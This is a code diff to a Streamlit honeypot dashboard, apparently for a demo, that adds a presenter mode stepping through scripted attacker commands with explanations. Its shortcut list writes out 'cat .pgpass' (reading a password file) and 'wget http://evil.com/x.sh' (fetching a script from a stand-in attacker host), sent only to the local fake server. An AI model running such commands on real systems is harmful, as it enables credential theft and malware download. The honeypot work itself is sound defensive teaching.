@@ -1,7 +1,11 @@
+import os
 import time
 import requests
 import pandas as pd
 import streamlit as st
+from dotenv import load_dotenv
+
+load_dotenv()
 
 API_URL = "http://127.0.0.1:5000"
 HOSTNAME = "prod-db-01"
@@ -13,6 +17,13 @@ st.title("PhantomNet: Attacker Activity Dashboard")
 
 ss = st.session_state
 
+# Presenter mode is OFF by default. It is switched on by opening the page with
+# ?presenter=1 in the address, or by PHANTOMNET_PRESENTER=1 in your local .env file.
+PRESENTER = (
+    os.getenv("PHANTOMNET_PRESENTER", "0") == "1"
+    or st.query_params.get("presenter") == "1"
+)
+
 
 def reset_terminal():
     ss.term_lines = [BANNER, ""]
@@ -21,6 +32,7 @@ def reset_terminal():
     ss.last_info = ""
     ss.summary_text = ""
     ss.last_session = None
+    ss.demo_step = 0
 
 
 def api_get(path, params=None):
@@ -44,6 +56,64 @@ def format_summary(s):
     return "\n".join(lines)
 
 
+EXPLAIN = {
+    "whoami": "The attacker asks which user they are. Python answered instantly with a fixed reply. Logged as recon (low risk).",
+    "ls": "The attacker lists the files. Python showed the fake bait files. Logged as recon (low risk).",
+    "cat .pgpass": "The attacker reads a password file. The credentials in it are fake bait. Logged as credential_access (medium risk).",
+    "exit": "The session ended. The admin now gets a summary of everything the attacker did.",
+}
+SOURCE_TEXT = {
+    "python": "Python (fixed answer)",
+    "llm": "Gemini AI (generated answer)",
+    "llm-error": "a fallback message (the AI was busy)",
+}
+
+
+def explain(command, j):
+    key = " ".join(command.split())
+    if key.startswith("wget "):
+        return ("The attacker tries to download a malicious script. The fake server has no internet, "
+                "so it fails like a real one. Logged as malware_download (high risk), so an alert is raised.")
+    if key in EXPLAIN:
+        return EXPLAIN[key]
+    return (f"Answered by {SOURCE_TEXT.get(j['source'], j['source'])}. "
+            f"Logged as {j['category']} (severity: {j['severity']}).")
+
+
+def run_command(command):
+    ss.term_lines.append(ss.term_prompt + command)
+    body = {"command": command}
+    if ss.term_sid:
+        body["session_id"] = ss.term_sid
+    try:
+        with st.spinner("The honeypot is answering..."):
+            resp = requests.post(f"{API_URL}/api/command", json=body, timeout=180)
+        if resp.status_code == 200:
+            j = resp.json()
+            ss.term_sid = j["session_id"]
+            ss.last_session = j["session_id"]
+            if j["output"]:
+                ss.term_lines.append(j["output"])
+            ss.term_prompt = j["prompt"]
+            ss.last_info = explain(command, j)
+            if command.split()[0] in ("exit", "logout"):
+                try:
+                    ss.summary_text = format_summary(api_get(f"/api/summary/{ss.term_sid}"))
+                except requests.RequestException:
+                    ss.summary_text = ""
+                ss.term_sid = None
+                ss.term_prompt = START_PROMPT
+                ss.term_lines.append("")
+        else:
+            try:
+                msg = resp.json().get("error", resp.text)
+            except ValueError:
+                msg = resp.text
+            ss.term_lines.append(f"[API error {resp.status_code}: {msg}]")
+    except requests.RequestException:
+        ss.term_lines.append("[Could not reach the API. Is api.py running?]")
+
+
 if "term_lines" not in ss:
     reset_terminal()
 
@@ -65,46 +135,46 @@ with st.form("terminal_form", clear_on_submit=True):
 if st.button("Start new session", key="new_session_btn"):
     reset_terminal()
 
-if run and cmd.strip():
-    command = cmd.strip()
-    ss.term_lines.append(ss.term_prompt + command)
-    body = {"command": command}
-    if ss.term_sid:
-        body["session_id"] = ss.term_sid
-    try:
-        with st.spinner("The honeypot is answering..."):
-            resp = requests.post(f"{API_URL}/api/command", json=body, timeout=180)
-        if resp.status_code == 200:
-            j = resp.json()
-            ss.term_sid = j["session_id"]
-            ss.last_session = j["session_id"]
-            if j["output"]:
-                ss.term_lines.append(j["output"])
-            ss.term_prompt = j["prompt"]
-            ss.last_info = (
-                f"Last command was classified as: {j['category']} "
-                f"(severity: {j['severity']}, answered by: {j['source']})"
-            )
-            if command.split()[0] in ("exit", "logout"):
-                try:
-                    ss.summary_text = format_summary(api_get(f"/api/summary/{ss.term_sid}"))
-                except requests.RequestException:
-                    ss.summary_text = ""
-                ss.term_sid = None
-                ss.term_prompt = START_PROMPT
-                ss.term_lines.append("")
+SHORTCUTS = [
+    ("1. whoami", "whoami"),
+    ("2. ls", "ls"),
+    ("3. cat .pgpass", "cat .pgpass"),
+    ("4. wget evil.com/x.sh", "wget http://evil.com/x.sh"),
+    ("5. exit", "exit"),
+]
+clicked = None
+note_box = None
+if PRESENTER:
+    with st.sidebar.expander("Presenter panel (this laptop only)", expanded=False):
+        step = ss.demo_step
+        for n, (label, _) in enumerate(SHORTCUTS):
+            name = label.split(". ", 1)[1]
+            if n < step:
+                st.caption(f"done  {n + 1}. {name}")
+            elif n == step:
+                st.markdown(f"**next  {n + 1}. {name}**")
+            else:
+                st.caption(f"      {n + 1}. {name}")
+        if step < len(SHORTCUTS):
+            if st.button(f"Run next step ({step + 1} of {len(SHORTCUTS)})", key="demo_next"):
+                clicked = SHORTCUTS[step][1]
         else:
-            try:
-                msg = resp.json().get("error", resp.text)
-            except ValueError:
-                msg = resp.text
-            ss.term_lines.append(f"[API error {resp.status_code}: {msg}]")
-    except requests.RequestException:
-        ss.term_lines.append("[Could not reach the API. Is api.py running?]")
+            st.success("Demo finished.")
+        if st.button("Restart demo steps", key="demo_restart"):
+            ss.demo_step = 0
+            st.rerun()
+        note_box = st.empty()
+
+if clicked:
+    ss.demo_step += 1
+    run_command(clicked)
+    st.rerun()
+elif run and cmd.strip():
+    run_command(cmd.strip())
 
 term_box.code("\n".join(ss.term_lines[-45:]) + "\n" + ss.term_prompt, language="bash")
-if ss.last_info:
-    st.caption(ss.last_info)
+if PRESENTER and note_box is not None and ss.last_info:
+    note_box.info("What just happened: " + ss.last_info)
 if ss.summary_text:
     st.markdown("**Session summary (admin only)**")
     st.code(ss.summary_text, language="text")
